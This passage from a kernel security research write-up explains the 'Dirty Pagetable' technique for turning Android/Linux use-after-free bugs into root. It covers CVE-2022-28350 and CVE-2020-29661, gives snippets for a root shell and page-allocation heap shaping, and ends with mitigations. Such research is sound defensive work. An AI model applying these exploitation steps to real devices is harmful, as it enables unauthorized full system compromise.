        spin_lock_irq(¤t->sighand->siglock);
        ctx->sigmask = *mask;                       // <----- limited write operation to signalfd_ctx 
        spin_unlock_irq(¤t->sighand->siglock);

        wake_up(¤t->sighand->signalfd_wqh);
        fdput(f);
    }

    return ufd;
}
```

And lucky for us, the bit18 of the physical address of the do_signalfd4() happens to be 1, so we can patch the

`sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));`

sentence to remove the writing limitation.

##### Step3. Patch the kernel[](#step3-patch-the-kernel "Permanent link")

We need to patch `selinux_state` and a few functions(setresuid(), setresgid()…) to get the full privilege of the Google Pixel 7. Because only one PTE gets controlled, we have to modify the physical address of the PTE multiple times to patch all the data and functions we need to patch.

##### Step4. Call the setresuid(), setresgid() to get root[](#step4-call-the-setresuid-setresgid-to-get-root "Permanent link")

Since setresuid() and setresgid() have been patched by us, we can get root by calling the following code directly:

```
if (setresuid(0, 0, 0) < 0) {
    perror("setresuid");
} else {
    if (setresgid(0, 0, 0) < 0) {
        perror("setresgid");
    } else {
        printf("[+] Spawn a root shell\n");
        system("/system/bin/sh");
    }
}
```

Finally， we succeeded in fulfilling privilege escalation on Google pixel 7:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pixel7_root.png)

Figure 13

### 3.6 Reflections[](#36-reflections "Permanent link")

We found that Dirty Pagetable is a very powerful exploitation method for double free vulnerabilities especially. We only present a typical privilege escalation with CVE-2023-21400 here. There are quite a few well-known double free vulnerabilities in recent years, such as CVE-2021-22600[3] and CVE-2022-22265[4]. Could these vulnerabilities be exploited with Dirty Pagetable more conveniently? We leave the question to readers. Have fun!

4. Exploit file UAF with Dirty Pagetable[](#4-exploit-file-uaf-with-dirty-pagetable "Permanent link")
------------------------------------------------------------------------------------------------------

### 4.1. File UAF: One of the most popular vulnerabilities in recent years[](#41-file-uaf-one-of-the-most-popular-vulnerabilities-in-recent-years "Permanent link")

A file object is a fundamental object in the kernel. And the file UAF is such a popular vulnerability that I have seen so many file UAF vulnerabilities found by different researchers last year. Surprisingly, there are more different exploits for such vulnerability, and some of them are even used in the wild. As far as I know, there are at least three different exploit methods for the file UAF:

The first exploit method is to get the released victim file object reused by other newly opened privileged files in the system, such as /etc/crontab. After that, we can write the privileged files and possibly get the root. This method has been mentioned and used by Jann Horn[1], Mathias Krause[5], Zhenpeng Lin[6], and me[7] when exploiting different vulnerabilities. However, there are some disadvantages to this method. First, to use the method successfully in the newer kernel, we have to win a race, which requires some time window expanding skills and some luck. Second, the most privileged files can’t be written on Android because these files are located in the read-only file system. What’s worse, this method cannot actively escape from the container, making file UAF less valuable.

The second exploit method is to attack the page caches of system libraries or executables. The method is used by Xingyu Jin, Christian Resell, Clement Lecigne, Richard Neal[8], and Mathias Krause[9] when exploiting different file UAF vulnerabilities. We can inject malicious code into system libraries like libc.so with the method. When the privileged process executes the code of libc.so, the malicious code will be executed as a privileged user. The result of the method is just like what Dirtypipe did. It’s a huge advantage that the method doesn’t involve the race condition so that it can be used stably. However, this method requires much more work to get a complete privilege escalation on Android or actively escape from the container. And the method can’t be used for other kinds of UAF vulnerabilities.

The third exploit method is considered from the perspective of a cross-cache attack. Both Yong Wang[10] and Maddie Stone[11] exploit the file UAF in the way of a cross-cache attack. Before getting root, they all need to bypass the KASLR. Yong Wang[10] bypassed the KASLR by reusing the code of syscalls to guess the kslides, and Maddie Stone[11] bypassed the KASLR with another info leak issue. After bypassing the KASLR, they constructed a fake file object to finish the kernel read and kernel write primitive. We can see that the method require us to bypass KASLR in some way: by reusing kernel code or other info leak vulnerabilities.

It’s really cool that so many different exploitation methods and exploits finished by so many researchers just for the file UAF. I am so inspired by all the researchers that they just did excellent jobs and showed us how flexible and fun exploitation can be.

Let’s look at how we can fulfill privilege escalation with Dirty Pagetable.

### 4.2. Exploit the file UAF with Dirty Pagetable[](#42-exploit-the-file-uaf-with-dirty-pagetable "Permanent link")

We choose a well-known file UAF vulnerability——CVE-2022-28350 to demonstrate how Dirty Pagetable works in detail. We choose an affected Android device shipped with kernel 5.10 for the exploitation.

#### 4.2.1 CVE-2022-28350: A file UAF vulnerability in ARM Mali GPU driver[](#421-cve-2022-28350-a-file-uaf-vulnerability-in-arm-mali-gpu-driver "Permanent link")

The vulnerability I found last year existed in the ARM Mali GPU driver, affecting many Android 12 and Android 13 devices. The root cause of CVE-2022-28350 is quite simple:

```
static int kbase_kcpu_fence_signal_prepare(...) {
    ...
    /* create a sync_file fd representing the fence */
    sync_file = sync_file_create(fence_out); //<------ create the file object
    if (!sync_file) {
        ...
        ret = -ENOMEM;
        goto file_create_fail;
    }

    fd = get_unused_fd_flags(O_CLOEXEC); //<------ get an unused fd
    if (fd < 0) {
        ret = fd;
        goto fd_flags_fail;
    }

    fd_install(fd, sync_file->file); //<------ associate the file object with the fd

    fence.basep.fd = fd;
    ...
    if (copy_to_user(u64_to_user_ptr(fence_info->fence), &fence,
            sizeof(fence))) {
        ret = -EFAULT;
        goto fd_flags_fail; //<------ enter this routine !
    }

    return 0;

fd_flags_fail:
    fput(sync_file->file); //<------ release the file object
file_create_fail:
    dma_fence_put(fence_out);

    return ret;
}
```

As you can see, fd_install() gets called to associate the file object with the fd. The fd will be passed to user space with copy_to_user(). However, when copy_to_user() fails, the file object will be released, resulting in a valid fd associated with an already released file object:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic1_dangling_file.svg)

Figure 14

We can see that the victim fd is associated with a released file object at the slab of the filp kmem cache. It’s easy to get this scene with CVE-2022-28350; more details can be found here[7]. The released file object is the victim file object used later. And the slab in which the victim file object lies is the victim slab.

#### 4.2.2 Reclaim the victim slab into the page allocator[](#422-reclaim-the-victim-slab-into-the-page-allocator "Permanent link")

This step is a regular part of the cross-cache attack. After we trigger the vulnerability and free all the other objects on the victim slab, the victim slab may be reclaimed into the page allocator. And many researchers have proposed ways to ensure this. So no more discussion here.

#### 4.2.3 Occupy the victim slab with user page tables[](#423-occupy-the-victim-slab-with-user-page-tables "Permanent link")

We know that the size of the slab of filp kmem cache is two pages on Android, and the size of the user page table is one page. Although the size of the victim slab and user page table is unequal, we still get a big chance to occupy the victim slab with the user page tables by heap spray. In practice, the success rate of occupation is almost 100%. After the occupation, the layout of the victim file object and user page table is supposed to be like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic2_occupy_slab_with_pagetable.svg)

Figure 15

As you can see, the victim file object locates in the user page table.

#### 4.2.4 Construct the increment primitive and locate the virtual user address corresponding to the victim PTE[](#424-construct-the-increment-primitive-and-locate-the-virtual-user-address-corresponding-to-the-victim-pte "Permanent link")

Although we make the victim file object located in the user page table, we can perform very limited operations on the victim file object because it’s an illegal file object. Most operations on the victim file object would trigger illegal memory access, and kernel panic would happen. After a long time of searching, I found that the `f_count` field of the file object can be incremented by one many times with dup() without triggering a kernel panic. Because the dup() consumes fd resources and a single process can only generate 32768 fd at most, we can only add 32768 to `f_count` at most in a process. This is just not enough(You will know the reason later). So I kept on looking, and it turns out that fork()+dup() would help us break the limitation. We can call fork() first, which will add 1 to the `f_count` of the victim file object, and then in the child process, we can add 32768 to `f_count`. Because we can repeat fork()+dup() many times, so we succeed in breaking the limitation. Although there is still a limitation for the increment times, it won’t bother us that much.

We now have an increment primitive for the `f_count` of the victim file object. Our next step is obvious: let the position of the victim PTE coincide with the `f_count`, then we can perform the increment primitive to the victim PTE and control it to some extent.

The aligned size of a file object is 320 bytes, the offset of `f_count` is 56, and the size of `f_count` is 8 bytes:

```
(gdb) ptype /o struct file
/* offset      |    size */  type = struct file {
/*      0      |      16 */    union {
/*                     8 */        struct llist_node {
/*      0      |       8 */            struct llist_node *next;

                                       /* total size (bytes):    8 */
                                   } fu_llist;
/*                    16 */        struct callback_head {
/*      0      |       8 */            struct callback_head *next;
/*      8      |       8 */            void (*func)(struct callback_head *);

                                       /* total size (bytes):   16 */
                                   } fu_rcuhead;

                                   /* total size (bytes):   16 */
                               } f_u;
/*     16      |      16 */    struct path {
/*     16      |       8 */        struct vfsmount *mnt;
/*     24      |       8 */        struct dentry *dentry;

                                   /* total size (bytes):   16 */
                               } f_path;
/*     32      |       8 */    struct inode *f_inode;
/*     40      |       8 */    const struct file_operations *f_op;
/*     48      |       4 */    spinlock_t f_lock;
/*     52      |       4 */    enum rw_hint f_write_hint;
/*     56      |       8 */    atomic_long_t f_count;
/*     64      |       4 */    unsigned int f_flags;
......
......
/*    288      |       8 */    u64 android_oem_data1;

                               /* total size (bytes):  296 */
                             }
```

The size of the slab of filp kmem cache is two pages, and there are 25 file objects in a slab of filp kmem cache; the layout of a slab is like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic3_slab_layout_of_filp.svg)

Figure 16

Because there are 25 possible positions for the victim file object, to ensure that the `f_count` of the victim file object and the victim PTE are coincident in position, we have to prepare every user page table like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic4_pagetable_layout.svg)

Figure 17

Now we have made the `f_count` of the victim file object coincide with a valid PTE in position, and this valid PTE is the victim PTE. But how do we know the user virtual address corresponding to the victim PTE? This can be handled with the help of the increment primitive.

Before we perform the increment primitive, the page table and corresponding user virtual addresses should be like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic5_patable_and_va.svg)

Figure 18

As you can see, to better distinguish the physical page corresponding to each user virtual address, I write the virtual address into the first 8 bytes of each physical page as a mark. Because all the physical pages corresponding to the user virtual addresses are allocated at once, so physical addresses of them are highly likely to be contiguous.

If we try to add 0x1000 to the victim PTE with the increment primitive, it will change the physical page corresponding to the victim PTE just like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic6_change_victim_pte.svg)

Figure 19

As you can see that an interesting scene shows up: The victim PTE and another valid PTE would correspond to the same physical page! Now, we can traverse all the virtual pages to check the first 8 bytes of them: if the first 8 bytes of the virtual page are not the virtual address of it, then this virtual page is the one corresponding to the victim PTE. And we successfully find the user virtual address corresponding to the victim PTE!

#### 4.2.5 Catch a page table again[](#425-catch-a-page-table-again "Permanent link")

Now we got a victim PTE and a limited increment primitive to it. Our first thought is to set the physical address associated with the victim PTE to the physical address of kernel text/data. Well, that’s almost impossible because the physical address of the memory region allocated by mmap() is likely greater than the physical address of kernel text/data, and we only got a limited increment primitive which can’t overflow the victim PTE. We need to find another way.

Ever since we have made the victim PTE and another valid PTE correspond to the same physical page, what about we munmap() the virtual page of another valid PTE and trigger the release of the physical page? Yes, we will get a page UAF! After that, if we could occupy the released page with a user page table by heap spray, we would control a user page table. However, this idea doesn’t work well in practice because we can hardly occupy the released page with a user page table by heap spray on some devices. The root cause for this is that the physical pages allocated by anonymous mmap() usually come from the MIGRATE_MOVABLE free_area of the memory zone, while user page tables are usually allocated from the MIGRATE_UNMOVABLE free_area of the memory zone. This makes heap spray difficult to succeed. The research[10] presented by Yong Wang explained such difficulty very well.

Since the page UAF strategy doesn’t work, we came up with another strategy by which we succeeded in catching a user page table. Let’s see the new strategy step by step:

##### Step1. Heap shaping the sharing page and user page tables[](#step1-heap-shaping-the-sharing-page-and-user-page-tables "Permanent link")

We know that kernel space and user space need to share some physical pages in some cases. The sharing physical pages are mmaped into kernel space and user space at the same time, so they can be accessed from both spaces. Quite a few components can be used to allocate such sharing pages, such as dma-buf heaps, io_uring, GPUs and etc.

We choose the dma-buf system heap to allocate the sharing page for later use because `/dev/dma_heap/system` can be accessed from untrused apps in Android and the implementation of dma-buf is relatively simple. By open() the `/dev/dma_heap/system`, we can get a dma heap fd. And then, we can allocate a single sharing page with the following code:

```
struct dma_heap_allocation_data data;

    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;

    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
        perror("DMA_HEAP_IOCTL_ALLOC");
        return -1;
    }
    int dma_buf_fd = data.fd;
```

The single sharing page is represented by the dma_buf fd in user space and we can map the sharing page into user space by mmap() the dma_buf fd. Sharing pages allocated from dma-buf system heap are essentially allocated from the page allocator(actually dma-buf subsystem adapts a page pool for optimization, but this doesn’t bother us that much when exploiting, so no more discussion here). And the

`gfp_flags`

used to allocate the sharing pages is like this:

```
#define HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \
                | __GFP_NORETRY) & ~__GFP_RECLAIM) \
                | __GFP_COMP)
#define LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP)
static gfp_t order_flags[] = {HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP};
```

The

`HIGH_ORDER_GFP`

is used for order-8 pages and order-4 pages, the

`LOW_ORDER_GFP`

is used for order-0 page. It can be told from

`LOW_ORDER_GFP`

that the single sharing page is allocated from the MIGRATE_UNMOVABLE free_area of memory zone exactly the same as the page tables allocated from. And the order of the single sharing page is 1, which is exactly the same as the order of pages of a page table. Now we can come to a conclusion: The single sharing page and page table are allocated from the same migrate free_cache with the same order.

Based on the conclusion, we can easily get the single sharing page and user page tables laid out in memory like Figure 20 shows if we perform the following operations in the current process:

```
step1: allocate 3200 user page tables

step2: allocate the single sharing page with dma-buf system heap

step3: allocate 3200 user page tables
```

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic7_sharing_page_and_pagetables.svg)

Figure 20

As you can see, in physical memory, the single sharing page and user page tables are relatively compactly distributed. Now, we have succeeded in heap shaping the sharing page and user page tables.

##### Step2. Unmap the virtual address associated with the victim PTE and map the sharing page to the virtual address[](#step2-unmap-the-virtual-address-associated-with-the-victim-pte-and-map-the-sharing-page-to-the-virtual-address "Permanent link")

We know that the single sharing page can be mapped to user space by mmap() the dma_buf fd, so if we munmap() the virtual address associated with victim PTE and map the single sharing page to this virtual address, we will get a scene like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic8_remap_sharing_page.svg)

Figure 21

##### Step3. Catch the user page table with the increment primitive[](#step3-catch-the-user-page-table-with-the-increment-primitive "Permanent link")

Now, if we perform the increment primitive to add 0x1000, 0x2000, 0x3000, and so on to the victim PTE, we will have a huge chance to make the victim PTE be associated with a user page table just like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic9_catch_uesr_pagetable.svg)

Figure 22

As you can see, we succeed in catching a user page table!

#### 4.2.6 Patch kernel to get root![](#426-patch-kernel-to-get-root "Permanent link")

We already controlled a user page table. By modifying the PTEs in the user page table, we can modify kernel text/data as we want. By performing similar operations in 3.5.5 we can get the full privilege of the affected Android device:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/file_uaf_root.jpg)

Figure 23

5. Exploit pid UAF vulnerability with Dirty Pagetable[](#5-exploit-pid-uaf-vulnerability-with-dirty-pagetable "Permanent link")
--------------------------------------------------------------------------------------------------------------------------------

### 5.1 Brief introduction to CVE-2020-29661[](#51-brief-introduction-to-cve-2020-29661 "Permanent link")

CVE-2020-29661 is a well-known pid UAF vulnerability, which has been exploited by many researchers including Jann Horn[12] and Yong Wang[10]. Jann Horn exploited the vulnerability on Debian by manipulating the user page tables to modify the page caches of readonly files such as a setuid binary. And all the details can be seen in his great blog “How a simple Linux kernel memory corruption bug can lead to complete system compromise”[12]. However, the exploitation method provided by Jann Horn has some disadvantages: First, it only gets the root privilege in user space so it cannot be used to escape containers directly. And also, this method can’t help us get a complete privilege escalation directly on Android because of SELinux.

With the help of Dirty Pagetable, we manage to rewrite the exploit for CVE-2020-29661. Our new exploitation makes CVE-2020-29661 much more powerful and all the aforementioned disadvantages are out of concern. We succeeded in rooting an affected Google Pixel 4 shipped with kernel 4.14.

The exploit for CVE-2020-29661 is very similar to the file UAF vulnerability. To be more specific, both pid UAF and file UAF are manipulating the PTE with similar increment primitives. So the exploiation steps for pid UAF vulnerability are almost same as the exploitation for the file UAF.

I will only focus on the key exploitation steps in the following sections.

### 5.2 Exploit CVE-2020-29661 with Dirty Pagetable[](#52-exploit-cve-2020-29661-with-dirty-pagetable "Permanent link")

Similar to the file UAF, after triggering the CVE-2020-29661 and free all the other pid objects in the victim slab, we can occupy the victim slab with user page tables by performing similar operations in 4.2.2 ~ 4.2.3. As show in Figure 24, the victim pid object locates in the user page table:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets4/pic1_occupy_slab_with_pagetable_pid.svg)

Figure 24

#### 5.2.1 Construct a proper increment primitive with pid UAF[](#521-construct-a-proper-increment-primitive-with-pid-uaf "Permanent link")

Just like the file UAF, we need to construct a proper increment primitive to modify the victim PTE.

We choose the `count` field of the victim pid object to be coincided with a valid PTE. The `count` field is the first field of the pid object and it’s aligned with 8:

```
struct pid
{
    refcount_t count; //<------------- 4bytes, aligned with 8
    unsigned int level;
    spinlock_t lock;
    /* lists of tasks that use this pid */
    struct hlist_head tasks[PIDTYPE_MAX];
    struct hlist_head inodes;
    /* wait queue for pidfd notifications */
    wait_queue_head_t wait_pidfd;
    struct rcu_head rcu;
    struct upid numbers[1];
};
```

Although the

`count`

field is 4 bytes size, it happens to be coincided with lower 4bytes of a PTE. So it would be enough for us to modify a PTE by manipulating the

`count`

. Moreover, Jann horn[12] has constructed an increment primitive for

`count`

. With this increment primitive, we can add a number to the victim PTE.

However, the increment primitive for `count` is still under a limitation: it can only add 32768 to `count` at most because of limited fd resources in a process. To break the limitation, we can make use of fork() to perform increment primitive in multiple process. This operation allows us to add a large enough number to the victim PTE.

#### 5.2.2 Allocate the sharing pages[](#522-allocate-the-sharing-pages "Permanent link")

In kernel 4.14, there is no dma-buf system heap for us to allocate sharing pages. However, we get ION to do the similar work. Actually, ION is even more convenient because ION provided flags to let us allocate the sharing pages from page allocator directly. We can allocate sharing pages with the following code:

```
#if LEGACY_ION
int alloc_pages_from_ion(int num) {

    struct ion_allocation_data data;
    memset(&data, 0, sizeof(data));

    data.heap_id_mask = 1 << ION_SYSTEM_HEAP_ID;
    data.len = 0x1000*num;
    data.flags = ION_FLAG_POOL_FORCE_ALLOC;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &data) < 0) {
        perror("ioctl");
        return -1;
    };

    struct ion_fd_data fd_data;
    fd_data.handle = data.handle;
    if (ioctl(ion_fd, ION_IOC_MAP, &fd_data) < 0) {
        perror("ioctl");
        return -1;
    }
    int dma_buf_fd = fd_data.fd;
    return dma_buf_fd;
}
#else
int alloc_pages_from_ion(int num) {

    struct ion_allocation_data data;
    memset(&data, 0, sizeof(data));

    data.heap_id_mask = 1 << ION_SYSTEM_HEAP_ID;
    data.len = 0x1000*num;
    data.flags = ION_FLAG_POOL_FORCE_ALLOC;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &data) < 0) {
        perror("ioctl");
        return -1;
    }

    int dma_buf_fd = data.fd;

    return dma_buf_fd;
}
#endif
```

The sharing pages are represented by the dma_buf fd in user space and we can map the sharing pages into user space by mmap() the dma_buf fd.

#### 5.2.3 Root the affected Google Pixel 4[](#523-root-the-affected-google-pixel-4 "Permanent link")

We succeed in rooting the affected Google Pixel 4:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets4/root_pixel4.png)

Figure 25

6. Challenges when exploiting with Dirty Pagetable[](#6-challenges-when-exploiting-with-dirty-pagetable "Permanent link")
--------------------------------------------------------------------------------------------------------------------------

When exploiting the vulnerabilities, we ran into some hard-to-solve issues that prevent us from using Dirty Pagetable correctly. We spent a lot of time fixing these issues. Let’s have a look at these issues and how we solved them.

### 6.1 How to flush TLB and page table caches[](#61-how-to-flush-tlb-and-page-table-caches "Permanent link")

To speed up the MMU’s page table lookups, ARM64 uses multiple levels of caches, such as translation lookaside buffers(TLBs) and special-purpose page table caches. To use Dirty Pagetable successfully, we must flush these caches reliably before accessing user page tables. Otherwise, we might not be able to patch kernel correctly.

Luckily, Stephan van Schaik, Kaveh Razavi, Ben Gras, Herbert Bos, and Cristiano Giuffrida have come up with a reliable method to flush these caches in the paper “Reverse Engineering Hardware Page Table Caches Using Side-Channel Attacks on the MMU”[13]. We can flush TLB and other page table caches reliably with the method.

### 6.2 How to prevent the unexpected actions on the page table during the privilege escalation[](#62-how-to-prevent-the-unexpected-actions-on-the-page-table-during-the-privilege-escalation "Permanent link")

Two unexpected actions might happen when we make use of Dirty Pagetable.

The first unexpected action is that we might occupy the victim slab with non-last-level page tables. For example, we might occupy the victim slab with level-2 page tables instead of level-3 page tables on Android. Only when we succeeded in occupying the victim slab with last-level page tables, we can perform Dirty Pagetable correctly. Strange kernel errors might happen if we mistakenly occupy the victim slab with non-last-level page tables. The root cause of this unexpected action is that we ignored an important fact: non-last-level page tables could also be allocated when allocating a large number of last-level page tables. To avoid this unexpected action, we should trigger the allocation of non-last-level page tables before the heap spray with last-level page tables.

The second unexpected action is that kernel might swap out the page associated with the PTE we are modifying. This action will make the PTE we are modifying illegal, and kernel panic will happen if we try to access the corresponding virtual address of this illegal PTE. To avoid this unexpected action, we can use mlock() to lock the virtual address corresponding to the PTE into RAM, or try not to let memory under too much pressure to prevent that page from being swapped out to the swap area.

7. Mitigation for Dirty Pagetable[](#7-mitigation-for-dirty-pagetable "Permanent link")
----------------------------------------------------------------------------------------

We can mitigate Dirty Pagetable in many aspects.

First, Kernel physical address randomization can slightly mitigate Dirty Pagetable because we cannot know the exact kernel physical address directly. However, we can still choose to compromise other kernel heap datas to fulfill privilege escalation, which don’t require us to bypass kernel physical address randomization.

Second, making user page tables read-only could be an effective method to mitigate Dirty Pagetable because we can no longer directly manipulate user page tables with vulnerabilities. But this method might bring some overhead to kernel because kernel needs to do more work for modifying page tables.

Third, we can use hypervisor or Trustzone techniques to make kernel text and other critical memory regions read-only. This effective method prevents Dirty Pagetable from modifying kernel text and other critical memory regions.

8. Acknowlegements[](#8-acknowlegements "Permanent link")
----------------------------------------------------------

Thanks a lot to 某因幡 and Ye Zhang([@VAR10CK](https://twitter.com/VAR10CK)). They helped me review the article and made great advice!

9. References[](#9-references "Permanent link")
------------------------------------------------

[1] [https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf)  
[2] [https://lifeasageek.github.io/papers/yoochan-exprace-bh.pdf](https://lifeasageek.github.io/papers/yoochan-exprace-bh.pdf)  
[3] [https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf](https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf)  
[4] [https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html)  
[5] [https://seclists.org/oss-sec/2022/q1/99](https://seclists.org/oss-sec/2022/q1/99)  
[6] [https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf)  
[7] [https://i.blackhat.com/USA-22/Wednesday/US-22-Wu-Devils-Are-in-the-File.pdf](https://i.blackhat.com/USA-22/Wednesday/US-22-Wu-Devils-Are-in-the-File.pdf)  
[8] [https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf](https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf)  
[9] [opensrcsec/same_type_object_reuse_exploits](https://github.com/opensrcsec/same_type_object_reuse_exploits "GitHub Repository: opensrcsec/same_type_object_reuse_exploits")  
[10] [https://i.blackhat.com/USA-22/Thursday/US-22-WANG-Ret2page-The-Art-of-Exploiting-Use-After-Free-Vulnerabilities-in-the-Dedicated-Cache.pdf](https://i.blackhat.com/USA-22/Thursday/US-22-WANG-Ret2page-The-Art-of-Exploiting-Use-After-Free-Vulnerabilities-in-the-Dedicated-Cache.pdf)  
[11] [https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html)  
[12] [https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html](https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html)  
[13] [https://www.semanticscholar.org/paper/Reverse-Engineering-Hardware-Page-Table-Caches-on-Schaik/32c37ad63901eeafc848c2f8d9a73db42b365e9f](https://www.semanticscholar.org/paper/Reverse-Engineering-Hardware-Page-Table-Caches-on-Schaik/32c37ad63901eeafc848c2f8d9a73db42b365e9f)